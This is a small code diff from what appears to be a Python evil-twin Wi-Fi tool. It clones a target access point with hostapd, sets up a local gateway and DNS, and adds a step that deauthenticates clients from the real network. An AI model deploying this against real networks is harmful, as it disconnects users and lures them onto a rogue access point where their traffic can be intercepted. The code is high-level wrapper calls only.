@@ -28,12 +28,16 @@ monitor.scan(INTERFACE)
 target_id = ap.choose_access_point()
 ap.make_hostapd_conf(target_id, INTERFACE)
 
+
 # Set up local gateway and DNS
 interface.establish_gateway(INTERFACE)
 interface.establish_dns(INTERFACE)
 
 # Start hosting the access point
 ap.execute_hostapd(target_id)
+
+# Deauth clients on target network
+ap.deauth(target_id, INTERFACE)
 
 # print_stdout(iwconfig)
 print("You did it!")
